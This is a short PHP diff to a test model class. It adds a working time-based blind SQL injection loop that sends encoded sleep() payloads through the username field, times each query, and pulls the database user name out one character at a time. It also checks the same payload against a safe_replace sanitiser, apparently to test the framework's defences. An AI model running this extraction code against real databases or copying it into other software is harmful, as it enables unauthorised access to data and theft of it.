@@ -23,9 +23,10 @@ class Test_model extends GT_model{
                 $status = false;
                 while(true){
                     $start_time = microtime(true);
-                                        var_dump($this->getLastSql());
+                    $query_str ="%2b(select(0)from(select(sleep((mid(user(),".$i.",1)=='".$str."')*4)))v)%2b";
+                    $result = $this->findByAttr(array('username'=>$query_str));
+                    var_dump(microtime(true)-$start_time);
                     if(microtime(true)-$start_time>4){
-                        pr("okokokok");
                         $res .= $str;
                         $status = true;
                         sleep(1);
@@ -41,6 +42,8 @@ class Test_model extends GT_model{
         }
         var_dump($res);
         die("ddd");
+        $data['username'] = "%2b(select(0)from(select(sleep((mid(user(),1,1)=='g')*4)))v)%2b";
+        $data['username'] = safe_replace($data['username']);
         #$data['password'] = "bsed";
         $result = $this->findByAttr($data);
         var_dump($this->getLastSql());
